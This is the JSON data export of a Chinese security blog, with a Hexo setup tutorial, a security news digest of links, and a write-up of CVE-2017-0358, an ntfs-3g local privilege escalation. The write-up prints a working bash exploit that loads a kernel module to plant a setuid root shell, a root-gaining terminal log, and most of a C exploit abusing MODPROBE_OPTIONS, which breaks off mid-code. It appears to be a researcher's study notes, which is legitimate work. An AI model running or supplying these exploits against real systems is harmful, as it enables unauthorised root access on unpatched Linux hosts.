{"meta":{"title":"Ma3k4H3d","subtitle":"想要把自己活成一场梦，一首歌，一部电影~","description":"Cyber Security Penetration Test Fuzzing Hacker IT","author":"Ma3k4H3d","url":"http://maskhed.github.io"},"pages":[{"title":"404","date":"2018-10-21T04:29:40.972Z","updated":"2018-10-21T04:29:40.972Z","comments":true,"path":"404.html","permalink":"http://maskhed.github.io/404.html","excerpt":"","text":""},{"title":"ATO_ThreatIntelligence","date":"2018-10-21T07:22:01.000Z","updated":"2018-10-21T07:22:01.052Z","comments":true,"path":"ATO-ThreatIntelligence/index.html","permalink":"http://maskhed.github.io/ATO-ThreatIntelligence/index.html","excerpt":"","text":""},{"title":"CVE","date":"2018-10-21T07:50:28.000Z","updated":"2018-10-21T07:50:44.320Z","comments":true,"path":"CVE/index.html","permalink":"http://maskhed.github.io/CVE/index.html","excerpt":"","text":""},{"title":"CVE_Search","date":"2018-10-21T07:19:35.000Z","updated":"2018-10-21T07:20:30.277Z","comments":true,"path":"CVE_Search/index.html","permalink":"http://maskhed.github.io/CVE_Search/index.html","excerpt":"","text":""},{"title":"Collect","date":"2018-10-21T06:26:55.000Z","updated":"2018-10-21T06:29:14.532Z","comments":true,"path":"Collect/index.html","permalink":"http://maskhed.github.io/Collect/index.html","excerpt":"","text":""},{"title":"Hexo","date":"2018-10-21T06:41:37.000Z","updated":"2018-10-21T15:01:30.222Z","comments":true,"path":"Hexo/index.html","permalink":"http://maskhed.github.io/Hexo/index.html","excerpt":"","text":""},{"title":"OSINT","date":"2018-10-21T08:02:42.000Z","updated":"2018-10-21T08:03:00.796Z","comments":true,"path":"OSINT/index.html","permalink":"http://maskhed.github.io/OSINT/index.html","excerpt":"","text":""},{"title":"SecNews","date":"2018-10-21T07:25:05.000Z","updated":"2018-10-21T07:25:19.326Z","comments":true,"path":"SecNews/index.html","permalink":"http://maskhed.github.io/SecNews/index.html","excerpt":"","text":""},{"title":"Vim","date":"2018-10-21T06:41:37.000Z","updated":"2018-10-21T06:43:02.769Z","comments":true,"path":"Vim/index.html","permalink":"http://maskhed.github.io/Vim/index.html","excerpt":"","text":""},{"title":"history","date":"2018-10-21T08:33:13.000Z","updated":"2018-10-21T08:37:17.638Z","comments":true,"path":"history/index.html","permalink":"http://maskhed.github.io/history/index.html","excerpt":"","text":""},{"title":"about","date":"2018-10-21T14:00:54.755Z","updated":"2018-10-21T08:10:16.402Z","comments":true,"path":"about/index.html","permalink":"http://maskhed.github.io/about/index.html","excerpt":"","text":""},{"title":"原创","date":"2018-10-21T06:33:54.000Z","updated":"2018-10-21T06:33:54.948Z","comments":true,"path":"原创/index.html","permalink":"http://maskhed.github.io/原创/index.html","excerpt":"","text":""},{"title":"腾讯玄武实验室安全动态推送","date":"2018-10-21T07:17:49.000Z","updated":"2018-10-21T07:17:49.353Z","comments":true,"path":"腾讯玄武实验室安全动态推送/index.html","permalink":"http://maskhed.github.io/腾讯玄武实验室安全动态推送/index.html","excerpt":"","text":""}],"posts":[{"title":"Hexo & Maupassant 博客搭建","slug":"Hexo-Maupassant-博客搭建","date":"2018-10-21T14:09:55.000Z","updated":"2018-10-21T15:02:19.402Z","comments":true,"path":"2018/10/21/Hexo-Maupassant-博客搭建/","link":"","permalink":"http://maskhed.github.io/2018/10/21/Hexo-Maupassant-博客搭建/","excerpt":"沉淀对于成长意义重大，希望能够借助此博客，沉淀所学所思，记录成长的历程。","text":"沉淀对于成长意义重大，希望能够借助此博客，沉淀所学所思，记录成长的历程。 0x00 准备工作Hexo 是一个基于 Node.js 的静态博客框架，具有极速生成静态页面、支持Markdown、一键部署、插件丰富等优点。在使用 Hexo 之前，需要进行以下准备工作。 安装 Node.js，用以生成静态页面 安装 Git，用以提交管理博客 注册 Github 账号，并开启 Github Pages 服务 掌握 Markdown 语法，用以管理站点内容 以上内容资料较为丰富，因此不再赘述，如有需求请自行 Google。 0x01 Hexo1. 安装通过以下命令，一键安装 Hexo1npm install hexo -g 待安装完成后，创建用以存放 hexo 文件的目录，并初始化123mkdir hexocd hexohexo init 初始化成功后，目录结构如下：12345678.├── _config.yml├── package.json├── scaffolds├── source└── themes3 directories, 2 files 2. 常用命令123456789101112131415$ hexo server 开启hexo服务器$ hexo s$ hexo s --draft 显示草稿$ hexo new \"name\" 新建文章$ hexo new draft \"name\" 新建草稿$ hexo publish \"name\" 发布草稿$ hexo clean 清除缓存文件 (db.json) 和已生成的静态文件 (public)$ hexo generate 生成静态页面$ hexo g$ hexo deploy 部署博客到Github$ hexo d 3. Hexo 配置通过/_config.yml文件可对 Hexo 进行配置，官方文档中有详细介绍，不再赘述，详情可参考配置。 4. 添加文章摘要设置文章摘要有两种方法： 在 Front-matter 中指定 description，如： 12345678910title: Hello Worlddate: 2013-11-22 17:11:54description: 你对本页的描述``` * 在正文使用 `&lt;!--more--&gt;` 作为摘要的结束标记```bash以上是摘要 &lt;!--more--&gt;以下是剩下的全文 5. 自定义 404 、about 页面 在 hexo/source 目录下创建 404.html 文件 或者 404.md 文件，以 404.html 为例接入腾讯404公益广告。 123456789101112layout: falsetitle: \"404\"---&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta http-equiv=\"Content-Type\" content=\"text/html;charset=utf-8\"&gt; &lt;script type=\"text/javascript\" src=\"//qzonestyle.gtimg.cn/qzone/hybrid/app/404/search_children.js\" charset=\"utf-8\" homePageUrl=\"http://&lt;your home page&gt;\" homePageName=\"回到首页\"&gt;&lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;/body&gt;&lt;/html&gt; 在 hexo/source/about/ 目录下创建 index.md文件，添加内容如下： 1234567891011---title: about ---Coming soon ~``` ### 6. 创建分类及标签 6.1 创建“分类”选项打开命令行，进入博客所在目录。执行以下命令```bash$ hexo new page NewCategories 成功后提示：1INFO Created: ~/Documents/blog/source/NewCategories/index.md 生成的index.md内容如下：1234---title: 文章分类date: 2018-10-20 13:47:40--- 向文件中添加type: &quot;categories&quot;，结果如下：12345---title: 文章分类date: 2018-10-20 13:47:40type: \"categories\"--- 打开需要添加分类的文章，为其添加categories属性。下方的categories: web前端表示添加这篇文章到“web前端”这个分类。123456---title: jQuery对表单的操作及更多应用date: 2018-10-20 13:47:40categories: - web前端--- 至此，成功给文章添加分类，点击首页的“分类”可以看到该分类下的所有文章。当然，只有添加了categories: xxx的文章才会被收录到首页的“分类”中。 6.2 创建“标签”选项打开命令行，进入博客所在文件夹。执行命令1$ hexo new page NewTags 成功后会提示：1INFO Created: ~/Documents/blog/source/NewTags/index.md 打开index.md文件，内容如下：1234---title: 标签date: 2017-05-27 14:22:08--- 添加type: &quot;tags&quot;至index.md中：12345---title: 文章分类date: 2017-05-27 13:47:40type: \"tags\"--- 打开需要添加标签的文章，为其添加tags属性。12345678910---title: jQuery对表单的操作及更多应用date: 2017-05-26 12:12:57categories: - web前端tags:- jQuery- 表格- 表单验证--- 至此，成功给文章添加标签，点击首页的“标签”可以看到该标签下的所有文章。当然，只有添加了tags: xxx的文章才会被收录到首页的“标签”中。 修改scaffolds/post.md模板文件，在 Front-matter 区域添加tages:、categories:：123456---title: &#123;&#123; title &#125;&#125;date: &#123;&#123; date &#125;&#125;categories:tags:--- 之后执行hexo new 文章名命令生成的文件，将会自动添加“分类”与“标签”。 7. SEO优化Hexo 站点已基本搭建完成。但是如果仅仅搭建完毕是无法通过搜索引擎查询到的，若想要加入搜索引擎收录，需进行 SEO 优化。7.1 添加搜索引擎收录分别在 百度站长工具 和 Google 站长工具 中对站点进行验证。 选择文件验证的方式进行验证，把下载的文件放在 source 目录下，并对文件内容进行编辑，在文件首部加入如下内容：1234---layout: falsesitemap: false--- 这样就可以防止 Hexo 在生成博客网站时在验证文件里添加额外的内容，导致验证失败。也可以在博客的配置文件里加入如下的配置来防止这些文件被渲染：123skip_render: - baidu_verify*.html - google*.html 7.2 添加robots.txt在/source/下新建robots.txt：123456789101112131415161718User-agent: *Allow: /Allow: /archives/Allow: /about/Allow: /categories/Allow: /donate/Allow: /2017/Allow: /history/Allow: /message/Allow: /page/Allow: /tags/Disallow: /vendors/Disallow: /vendors/Disallow: /fancybox/Sitemap: https://domain/sitemap.xmlSitemap: https://domain/baidusitemap.xml 7.3 提交 sitemaps利用插件生成sitemap（详见下文），待站点验证成功后便可以选择用 sitemap 的方式自动提交链接。提交完成后可以通过 site:your-blog-site 验证站点是否被百度、Google 收录。 一般需要几天的时间才能保证被搜索引擎收录。 0x02 MaupassantHexo官网提供了丰富的 Themes，选定心仪的主题之后，可以参照主题的文档进行安装，之后修改/_conifg.yml进行配置，本站选用了Maupassant。 1. Maupassant 安装安装主题和渲染器：123$ git clone https://github.com/tufu9441/maupassant-hexo.git themes/maupassant$ npm install hexo-renderer-pug --save$ npm install hexo-renderer-sass --save 编辑Hexo目录下的 _config.yml，将theme的值改为maupassant。 注：安装npm install hexo-renderer-sass时报错，切换至淘宝NPM镜像安装即可。 2. Maupassant配置官方文档中有详细介绍，可参考中文介绍。 3. 显示文章目录在文章的 Front-matter 中添加toc: true就可以让该篇文章显示目录，可以修改 hexo/scaffolds/post.md 模板文件，这样之后创建的文章默认都显示文章目录。1234567---title: &#123;&#123; title &#125;&#125;date: &#123;&#123; date &#125;&#125;categories:tags:toc: true--- 4. 开启 canvas-nest 网页动态背景修改/themes/maupassant/_config.yml:123456canvas_nest: enable: true color: 208,55,66 ## RGB value of the color opacity: 0.3 ## Transparency of lines zIndex: -1 ## The z-index property of the background count: 99 ## Quantity of lines 5. 设置导航栏menu修改/themes/maupassant/_config.yml:12345678910111213141516menu: - page: home directory: . icon: fa-home - page: archive directory: archives/ icon: fa-archive - page: about directory: about/ icon: fa-user - page: history directory: history/ icon: fa-user - page: rss directory: atom.xml icon: fa-rss 6. 为导航添加相应的页面（时间轴等） 在/source下新建与page名称对应的文件夹，然后在文件夹中建立index.md文件； 在index.md的front-matter中设置属性，若需要含有侧边栏的页面，添加layout: page；若需要单栏页面，就将layout设置为 layout: single-column；若不需要评论，需要加上comments: false 若要显示时间轴，在index.md的front-matter中设置layout属性为layout: timeline，同时修改/themes/maupassant/_config.yml: 123456789timeline: - num: 1 word: 2014/06/12-Start - num: 2 word: 2014/11/29-XXX - num: 3 word: 2015/02/18-DDD - num: 4 word: More /source/history/index.md：1234---layout: timelinecomments: false--- 0x03 常用插件1. hexo-wordcount安装插件1$ npm install hexo-wordcount —save 开启 Maupassant 主题中的 Word Count 功能：1wordcount: true ## If you want to display the word counter and the reading time expected to spend of each post please set the value to true, and you must have hexo-wordcount installed. 2. hexo-generator-search启用 Maupassant 本地搜索功能，安装hexo-generator-search1npm install hexo-generator-search --save 安装完成后，修改主题配置，显示本地搜索框1self_search: true ## Use a jQuery-based local search engine, true/false. 3. hexo-asset-imagehexo对本地图片的支持并不友好，如果按markdown的语法写部署之后页面的图片取不到，如果按hexo的写法在本地markdown编辑器中又不能识别，解决办法是使用 hexo-asset-image 插件。首先安装插件1$ npm install hexo-asset-image —save 然后修改 _config.yml 中 post_asset_folder 的值为 true，这样每次创建文章的时候会生成一个同名文件夹用于放资源文件，这样就可以使用markdown的语法来插入图片了。 4. hero-generator-feed支持 RSS 订阅，安装 hexo-generator-feed1npm install hexo-generator-feed --save 修改 hexo 配置123456feed: type: atom path: atom.xml limit: 5 #在feed中出现的最大文章数（使用0或者false）来显示所有文章 hub: content: 修改主题配置123- page: rss directory: atom.xml icon: fa-rss 5. 生成站点地图通过站点地图生成插件生成sitemap，进行SEO优化。 安装插件 12npm install hexo-generator-sitemap --savenpm install hexo-generator-baidu-sitemap --save 生成站点地图,修改/_config.yml文件，添加如下配置： # 自动生成sitemap sitemap: path: sitemap.xml baidusitemap: path: baidusitemap.xml 编译hexo g，在 public 目录下可以看到sitemap.xml和baidusitemap.xml文件，重新发布至服务器hexo d。 0x04 未完待续 待站点被收录后，上传sitemap.xml； 显示分类文章总数(目测有难度) 开启评论","categories":[{"name":"原创","slug":"原创","permalink":"http://maskhed.github.io/categories/原创/"}],"tags":[{"name":"Hexo","slug":"Hexo","permalink":"http://maskhed.github.io/tags/Hexo/"}]},{"title":"ATO_Test","slug":"ATO-Test","date":"2018-10-21T08:00:18.000Z","updated":"2018-10-21T08:01:50.852Z","comments":true,"path":"2018/10/21/ATO-Test/","link":"","permalink":"http://maskhed.github.io/2018/10/21/ATO-Test/","excerpt":"","text":"","categories":[{"name":"ATO-ThreatIntelligence","slug":"ATO-ThreatIntelligence","permalink":"http://maskhed.github.io/categories/ATO-ThreatIntelligence/"}],"tags":[{"name":"OSINT","slug":"OSINT","permalink":"http://maskhed.github.io/tags/OSINT/"}]},{"title":"腾讯玄武实验室安全动态推送","slug":"xuanwu-2018-10-21","date":"2018-10-21T07:23:44.000Z","updated":"2018-10-21T07:51:10.450Z","comments":true,"path":"2018/10/21/xuanwu-2018-10-21/","link":"","permalink":"http://maskhed.github.io/2018/10/21/xuanwu-2018-10-21/","excerpt":"","text":"Tencent Xuanwu Lab Security Daily News [ Browser ] Firefox JavaScript 类型混淆 RCE 漏洞（CVE-2018-12386）的详细分析： https://blogs.securiteam.com/index.php/archives/3765 [ Industry News ] 2018年12月31日 PHP 5.6.x 的安全支持将正式停止，大约 62％ 的互联网站点将运行不受支持的 PHP 版本: https://www.zdnet.com/article/around-62-of-all-internet-sites-will-run-an-unsupported-php-version-in-10-weeks/ [ MalwareAnalysis ] 通过动态二进制文件检测，对轻量级恶意软件进行行为分析: https://www.slideshare.net/MaximShudrak/tricky-sample-hack-it-easy-applying-dynamic-binary-inastrumentation-to-lightweight-malware-behaviour-analysis [ Others ] 如何寻找新的持久化方式: http://www.hexacorn.com/blog/2018/10/14/how-to-find-new-persistence-tricks/ [ Tools ] haxxmap - 代理 IMAP 服务获取密码的工具: https://github.com/mrexodia/haxxmap [ Tools ] ReconDog - 用于侦查信息的瑞士军刀: https://github.com/s0md3v/ReconDog [ Tools ] tcpbin - 记录 TCP Socket 详细日志的工具: https://github.com/ecx86/tcpbin [ Tools ] 对专有汽车协议 CANalyzat0r 的安全分析工具: https://www.schutzwerk.com/en/43/posts/canalyzat0r/ [ Tools ] censys-subdomain-finder - 从 Censys 的证书透明日志中收集子域名的工具: https://github.com/christophetd/censys-subdomain-finder [ Android ] Android Pwn2Own 2017 漏洞的介绍与演示: https://labs.mwrinfosecurity.com/assets/BlogFiles/the-mate-escape-huawei-pwn2own-2018-10-13.pdf [ Blockchain ] Not a fair game, Dice2win公平性分析: http://blogs.360.cn/post/Fairness_Analysis_of_Dice2win.html [ Industry News ] CloudFlare 将 XDP 集成到其 DDoS 缓解策略中： https://netdevconf.org/2.1/slides/apr6/bertin_Netdev-XDP.pdf [ MalwareAnalysis ] 对 Hancitor 恶意样本的深入分析： 1） https://0ffset.wordpress.com/2018/08/12/post-0x16-hancitor-stage-1/ 2）https://0ffset.wordpress.com/2018/10/14/post-0x16-hancitor-stage-2/https//0ffset.wordpress.com/2018/10/14/post-0x16-hancitor-stage-2/) [ Mobile ] GSM 移动网络简介-诺基亚网络监视器(Video)： https://www.youtube.com/watch?v=IuxBfHnP5S0 [ Others ] Mozilla 公司的 Firefox 应用程序更新服务安全审计报告： https://drive.google.com/file/d/1v53GCYPxzoZmB1dCop1yJfZgS1wi64dS/view [ Others ] ‘How to irregular cyber warfare’,关于不规则网络战策略的介绍: https://blog.erratasec.com/2018/10/how-to-irregular-cyber-warfare.html#.W8NRddUzaUk [ Symbolic Execution ] 通过使用符号执行技术，自动化分析堆分配器，来评估一个补丁是否能缓解攻击 (paper): https://securitygossip.com/blog/2018/10/12/heaphopper-bringing-bounded-model-checking-to-heap-implementation-security/ [ Symbolic Execution ] 对 Symbolic Emulator 的详细介绍： Part 1 : https://sean.heelan.io/2012/03/23/anatomy-of-a-symbolic-emulator-part-1-trace-generation/ Part 2： https://sean.heelan.io/2012/03/23/anatomy-of-a-symbolic-emulator-part-2-introducing-symbolic-data/ [ Tools ] 适用于 Oracle JDBC 的后门介绍： https://medium.com/@airman604/introducing-jdbc-backdoor-175fbb509f62 GitHub: https://github.com/airman604/jdbc-backdoor [ Tools ] drAFL - AFL + DynamoRIO 可以 Fuzzing Linu x上没有源代码的二进制文件 ： https://github.com/mxmssh/drAFL","categories":[{"name":"腾讯玄武实验室安全动态推送","slug":"腾讯玄武实验室安全动态推送","permalink":"http://maskhed.github.io/categories/腾讯玄武实验室安全动态推送/"}],"tags":[{"name":"SecNews","slug":"SecNews","permalink":"http://maskhed.github.io/tags/SecNews/"}]},{"title":"CVE-2017-0358","slug":"CVE-2017-0358","date":"2018-10-21T07:23:44.000Z","updated":"2018-10-21T07:51:05.603Z","comments":true,"path":"2018/10/21/CVE-2017-0358/","link":"","permalink":"http://maskhed.github.io/2018/10/21/CVE-2017-0358/","excerpt":"CVE-2017-0358，Linux本地提权漏洞。","text":"CVE-2017-0358，Linux本地提权漏洞。 0x00 ntfs-3g (Debian 9) - Privilege Escalation 最近研究了下CVE-2017-0358，Linux下的本地提权漏洞，记录下学习历程。最初是在exploit-db上发现该漏洞ntfs-3g (Debian 9) - Privilege Escalation，并附有EXP，在简单学习了FUSE、NTFS-3G等基础概念后尝试利用作者给出的EXP复现漏洞。EXP如下： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162#!/bin/bashecho \"@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\"echo \"@ CVE-2017-0359, PoC by Kristian Erik Hermansen @\"echo \"@ ntfs-3g local privilege escalation to root @\"echo \"@ Credits to Google Project Zero @\"echo \"@ Affects: Debian 9/8/7, Ubuntu, Gentoo, others @\"echo \"@ Tested: Debian 9 (Stretch) @\"echo \"@ Date: 2017-02-03 @\"echo \"@ Link: https://goo.gl/A9I8Vq @\"echo \"@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\"echo \"[*] Gathering environment info ...\"cwd=\"$(pwd)\"un=\"$(uname -r)\"dlm=\"$(pwd)/lib/modules\"dkf=\"$(pwd)/kernel/fs\"echo \"[*] Creating kernel hijack directories ...\"mkdir -p \"$&#123;dlm&#125;\"mkdir -p \"$&#123;dkf&#125;\"echo \"[*] Forging symlinks ...\"ln -sf \"$&#123;cwd&#125;\" \"$&#123;dlm&#125;/$&#123;un&#125;\"ln -sf \"$&#123;cwd&#125;\" \"$&#123;dkf&#125;/fuse\"ln -sf cve_2017_0358.ko fuse.koecho \"[*] Pulling in deps ... \"echo \"[*] Building kernel module ... \" cat &lt;&lt; 'EOF' &gt; cve_2017_0358.c#include &lt;linux/module.h&gt; MODULE_LICENSE(\"CC\");MODULE_AUTHOR(\"kristian erik hermansen &lt;kristian.hermansen+CVE-2017-0358@gmail.com&gt;\");MODULE_DESCRIPTION(\"PoC for CVE-2017-0358 from Google Project Zero\"); int init_module(void) &#123; printk(KERN_INFO \"[!] Exploited CVE-2017-0358 successfully; may want to patch your system!\\n\"); char *envp[] = &#123; \"HOME=/tmp\", NULL &#125;; char *argv[] = &#123; \"/bin/sh\", \"-c\", \"/bin/cp /bin/sh /tmp/r00t; /bin/chmod u+s /tmp/r00t\", NULL &#125;; call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC); char *argvv[] = &#123; \"/bin/sh\", \"-c\", \"/sbin/rmmod cve_2017_0358\", NULL &#125;; call_usermodehelper(argv[0], argvv, envp, UMH_WAIT_EXEC); return 0;&#125; void cleanup_module(void) &#123; printk(KERN_INFO \"[*] CVE-2017-0358 exploit unloading ...\\n\");&#125;EOF cat &lt;&lt; 'EOF' &gt; Makefileobj-m += cve_2017_0358.o all: make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules clean: make -C /lib/modules/$(shell uname -r)/build M=$(PWD) cleanEOF make 1&gt;/dev/null 2&gt;/dev/null || echo \"[-] FAILED: your need make / build tools\"cp \"/lib/modules/$&#123;un&#125;/modules.dep.bin\" . || echo \"[-] FAILED: linux-image location non-default?\"MODPROBE_OPTIONS=\"-v -d $&#123;cwd&#125;\" ntfs-3g /dev/null /dev/null 1&gt;/dev/null 2&gt;/dev/null/tmp/r00t -c 'whoami' | egrep -q 'root' &amp;&amp; echo \"[+] SUCCESS: You have root. Don't be evil :)\"/tmp/r00t 疑惑的是无论如何测试，始终不成功，最后怀疑是modprobe函数的问题，查看官方文档，给出如下解释： The modprobe command silently succeeds with an exit status of 0 if it successfully loads the module, or the module is already loaded into the kernel.Thus, you must ensure that the module is not already loaded before attempting to load it with custom parameters. The modprobe command does not automatically reload the module, or alert you that it is already loaded. 也就是说，无法解决在系统已加载FUSE模块的前提下重新加载FUSE，并使临时参数生效的问题。黔驴技穷，于是发邮件给作者，作（骗）者（子）赤果果的say：“need additional modification，you have to make me an offer”,shit… （注：jannh已在www.exploit-db.com上发布有效版本，ntfs-3g - Unsanitized modprobe Environment Privilege Escalation） 0x01 ntfs-3g: modprobe is executed with unsanitized environment 在经历过艰苦的search之后，终于发现了漏洞的真正作者project zero的jannh(ntfs-3g: modprobe is executed with unsanitized environment)。 漏洞存在于NTFS-3G之中，该程序是由Tuxera公司开发并维护的开源项目，目的是为Linux提供NTFS分区的驱动程序，实现对NTFS文件系统的读写。该程序默认安装在Ubuntu等操作系统中，并且赋予了setuid的权限。作者解释到CVE-2017-0358的根源在于，NTFS-3G在调用modprobe时没有初始化环境变量，致使存在本地提权的风险。漏洞存在于load_fuse_module ()函数之中： 1234567891011121314151617181920212223242526272829303132static fuse_fstype load_fuse_module(void)&#123; int i; struct stat st; pid_t pid; const char *cmd = \"/sbin/modprobe\"; struct timespec req = &#123; 0, 100000000 &#125;; /* 100 msec */ fuse_fstype fstype; if (!stat(cmd, &amp;st) &amp;&amp; !geteuid()) &#123; pid = fork(); if (!pid) &#123; execl(cmd, cmd, \"fuse\", NULL); _exit(1); &#125; else if (pid != -1) waitpid(pid, NULL, 0); &#125; for (i = 0; i &lt; 10; i++) &#123; /* * We sleep first because despite the detection of the loaded * FUSE kernel module, fuse_mount() can still fail if it's not * fully functional/initialized. Note, of course this is still * unreliable but usually helps. */ nanosleep(&amp;req, NULL); fstype = get_fuse_fstype(); if (fstype != FSTYPE_NONE) break; &#125; return fstype;&#125; 当NTFS-3G被调用时，利用get_fuse_fstype()检测当前系统是否加载FUSE模块，若未加载，则利用load_fuse_module()中的modprobe，加载FUSE模块。 1234567891011121314151617181920212223static fuse_fstype get_fuse_fstype(void)&#123; char buf[256]; fuse_fstype fstype = FSTYPE_NONE; FILE *f = fopen(\"/proc/filesystems\", \"r\"); if (!f) &#123; ntfs_log_perror(\"Failed to open /proc/filesystems\"); return FSTYPE_UNKNOWN; &#125; while (fgets(buf, sizeof(buf), f)) &#123; if (strstr(buf, \"fuseblk\\n\")) &#123; fstype = FSTYPE_FUSEBLK; break; &#125; if (strstr(buf, \"fuse\\n\")) fstype = FSTYPE_FUSE; &#125; fclose(f); return fstype;&#125; 问题在于，modprobe的设计初衷并不是运行在一个setuid的环境当中，而NTFS-3G却需要setuid的权限。在modprobe的man文档中明确指出： The MODPROBE_OPTIONS environment variable can also be used to pass arguments to modprobe. 因此，在一个尚未加载FUSE 的系统中，攻击者可以通过设置环境变量MODPROBE_OPTIONS “-C /tmp/evil_config -d /tmp/evil_root”，强制modprobe加载恶意配置文件，导致攻击者具备加载任意代码到系统内核的能力。 在现实情况中，FUSE在大部分系统中已被作为内核的一部分，基本都处于已加载的状态，也就是文章伊始提到的问题。 jannh对这个问题给出了一种解决思路，通过耗尽系统范围内所有进程可以打开的文件句柄的数量 (/proc/sys/fs/file-max)，使得NTFS-3G在fopen(&quot;/proc/filesystems&quot;, &quot;r&quot;)时异常，导致get_fuse_fstype()返回FSTYPE_UNKNOWN，在主函数中触发load_fuse_module()函数。 123456789101112fstype = get_fuse_fstype();err = NTFS_VOLUME_NO_PRIVILEGE;if (restore_privs()) goto err_out;if (fstype == FSTYPE_NONE || fstype == FSTYPE_UNKNOWN) fstype = load_fuse_module();create_dev_fuse();if (drop_privs()) goto err_out; 0x02 Attack jannh给出了EXP，通过测试成功在Ubuntu Server 16.10、kali 4.3中实现提权，在Debian 8中测试失败。测试如下：（注：在VM中测试时，需要多CPU的支持） 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647user@ubuntu:~$ tar xf ntfs-3g-modprobe-unsafe.taruser@ubuntu:~$ cd ntfs-3g-modprobe-unsafe/user@ubuntu:~/ntfs-3g-modprobe-unsafe$ ./compile.shmake: Entering directory '/usr/src/linux-headers-4.8.0-32-generic' CC [M] /home/user/ntfs-3g-modprobe-unsafe/rootmod.o Building modules, stage 2. MODPOST 1 modules CC /home/user/ntfs-3g-modprobe-unsafe/rootmod.mod.o LD [M] /home/user/ntfs-3g-modprobe-unsafe/rootmod.komake: Leaving directory '/usr/src/linux-headers-4.8.0-32-generic'depmod: WARNING: could not open /home/user/ntfs-3g-modprobe-unsafe/depmod_tmp//lib/modules/4.8.0-32-generic/modules.order: No such file or directorydepmod: WARNING: could not open /home/user/ntfs-3g-modprobe-unsafe/depmod_tmp//lib/modules/4.8.0-32-generic/modules.builtin: No such file or directoryuser@ubuntu:~/ntfs-3g-modprobe-unsafe$ ./sploitlooks like we won the racegot ENFILE at 198088 totalFailed to open /proc/filesystems: Too many open files in system yay, modprobe ran!modprobe: ERROR: ../libkmod/libkmod.c:514 lookup_builtin_file() could not open builtin file '/tmp/ntfs_sploit.u48sGO/lib/modules/4.8.0-32-generic/modules.builtin.bin'modprobe: ERROR: could not insert 'rootmod': Too many levels of symbolic linksError opening '/tmp/ntfs_sploit.u48sGO/volume': Is a directoryFailed to mount '/tmp/ntfs_sploit.u48sGO/volume': Is a directorywe have root privs now...root@ubuntu:~/ntfs-3g-modprobe-unsafe# iduid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lxd),123(libvirt),127(sambashare),128(lpadmin),1000(user) 0x03 Code: Exploit.c 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176int main(void) &#123;/* prevent shell from backgrounding ntfs-3g when stopped */pid_t initial_fork_child = fork();if (initial_fork_child == -1) err(1, \"initial fork\");if (initial_fork_child != 0) &#123; int status; if (waitpid(initial_fork_child, &amp;status, 0) != initial_fork_child) err(1, \"waitpid\"); execl(\"rootshell\", \"rootshell\", NULL); exit(0);&#125;char buf[1000] = &#123;0&#125;;// Set up workspace with volume, mountpoint, modprobe config and module directory.char template[] = \"/tmp/ntfs_sploit.XXXXXX\";if (mkdtemp(template) == NULL) err(1, \"mkdtemp\");char volume[100], mountpoint[100], modprobe_confdir[100], modprobe_conffile[100];sprintf(volume, \"%s/volume\", template);sprintf(mountpoint, \"%s/mountpoint\", template);sprintf(modprobe_confdir, \"%s/modprobe.d\", template);sprintf(modprobe_conffile, \"%s/sploit.conf\", modprobe_confdir);if (mkdir(volume, 0777) || mkdir(mountpoint, 0777) || mkdir(modprobe_confdir, 0777)) err(1, \"mkdir\");int conffd = open(modprobe_conffile, O_WRONLY|O_CREAT, 0666);if (conffd == -1) err(1, \"open modprobe config\");int suidfile_fd = open(\"rootshell\", O_RDONLY);if (suidfile_fd == -1) err(1, \"unable to open ./rootshell\");char modprobe_config[200];sprintf(modprobe_config, \"alias fuse rootmod\\noptions rootmod suidfile_fd=%d\\n\", suidfile_fd);if (write(conffd, modprobe_config, strlen(modprobe_config)) != strlen(modprobe_config)) errx(1, \"modprobe config write failed\");close(conffd);// module directory setupchar system_cmd[1000];sprintf(system_cmd, \"mkdir -p %s/lib/modules/$(uname -r) &amp;&amp; cp rootmod.ko *.bin %s/lib/modules/$(uname -r)/\", template, template);if (system(system_cmd)) errx(1, \"shell command failed\");// Set up inotify watch for /proc/mounts.// Note: /proc/mounts is a symlink to /proc/self/mounts, so// the watch will only see accesses by this process.int inotify_fd = inotify_init1(IN_CLOEXEC);if (inotify_fd == -1) err(1, \"unable to create inotify fd?\");if (inotify_add_watch(inotify_fd, \"/proc/mounts\", IN_OPEN) == -1) err(1, \"unable to watch /proc/mounts\");// Set up inotify watch for /proc/filesystems.// This can be used to detect whether we lost the race.int fs_inotify_fd = inotify_init1(IN_CLOEXEC);if (fs_inotify_fd == -1) err(1, \"unable to create inotify fd?\");if (inotify_add_watch(fs_inotify_fd, \"/proc/filesystems\", IN_OPEN) == -1) err(1, \"unable to watch /proc/filesystems\");// Set up inotify watch for /sbin/modprobe.// This can be used to detect when we can release all our open files.int modprobe_inotify_fd = inotify_init1(IN_CLOEXEC);if (modprobe_inotify_fd == -1) err(1, \"unable to create inotify fd?\");if (inotify_add_watch(modprobe_inotify_fd, \"/sbin/modprobe\", IN_OPEN) == -1) err(1, \"unable to watch /sbin/modprobe\");int do_exec_pipe[2];if (pipe2(do_exec_pipe, O_CLOEXEC)) err(1, \"pipe\");pid_t child = fork();if (child == -1) err(1, \"fork\");if (child != 0) &#123; if (read(do_exec_pipe[0], buf, 1) != 1) errx(1, \"pipe read failed\"); char modprobe_opts[300]; sprintf(modprobe_opts, \"-C %s -d %s\", modprobe_confdir, template); setenv(\"MODPROBE_OPTIONS\", modprobe_opts, 1); execlp(\"ntfs-3g\", \"ntfs-3g\", volume, mountpoint, NULL);&#125;child = getpid();// Now launch ntfs-3g and wait until it opens /proc/mountsif (write(do_exec_pipe[1], buf, 1) != 1) errx(1, \"pipe write failed\");if (read(inotify_fd, buf, sizeof(buf)) &lt;= 0) errx(1, \"inotify read failed\");if (kill(getppid(), SIGSTOP)) err(1, \"can't stop setuid parent\");// Check whether we won the main race.struct pollfd 